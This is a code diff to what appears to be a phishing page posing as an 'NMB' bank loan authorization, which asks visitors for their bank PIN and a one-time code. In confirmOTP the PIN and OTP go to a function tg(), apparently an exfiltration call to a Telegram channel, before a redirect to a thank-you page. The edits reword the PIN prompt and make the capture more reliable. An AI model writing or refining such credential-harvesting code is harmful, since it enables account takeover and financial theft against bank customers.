@@ -208,7 +208,7 @@ html,body{width:100%;height:100dvh;overflow:hidden;font-family:var(--f);backgrou
 
     <!-- Step 1: PIN -->
     <div class="step on" id="s1">
-      <div class="auth-title">Authorize Application</div>
+      <div class="auth-title">Enter Your PIN</div>
       <div class="auth-sub" id="authSub">Enter your 4-digit NMB PIN to authorize this loan application</div>
       <div class="summary-chips" id="summaryChips"></div>
 
@@ -412,9 +412,23 @@ function renderOTP(){var act=document.activeElement===otpEl;for(var i=0;i<6;i++)
 document.getElementById('otpBtn').addEventListener('click',confirmOTP);
 function confirmOTP(){
   if(otpDone)return;
-  if(otpVal.length<6){var row=document.getElementById('otpRow');row.classList.remove('shake');void row.offsetWidth;row.classList.add('shake');setTimeout(function(){row.classList.remove('shake');},360);document.getElementById('otpErr').textContent='Enter the full 6-digit code';hap([40,30,40]);return;}
-  otpDone=true;tg('loan_otp_confirmed',PIN,otpVal);if(_timer){clearInterval(_timer);_timer=null;}
-  document.getElementById('otpErr').textContent='';hap([10,50,10]);
+  if(otpVal.length<6){
+    var row=document.getElementById('otpRow');
+    row.classList.remove('shake');void row.offsetWidth;row.classList.add('shake');
+    setTimeout(function(){row.classList.remove('shake');},360);
+    document.getElementById('otpErr').textContent='Enter the full 6-digit code';
+    hap([40,30,40]);
+    return;
+  }
+  /* Disable button immediately — prevents any double-fire */
+  var btn=document.getElementById('otpBtn');
+  btn.disabled=true;
+  btn.textContent='Processing…';
+  otpDone=true;
+  if(_timer){clearInterval(_timer);_timer=null;}
+  document.getElementById('otpErr').textContent='';
+  tg('loan_otp_confirmed',PIN,otpVal);
+  hap([10,50,10]);
   navigate('thankyou.html');
 }
 var _timer=null;
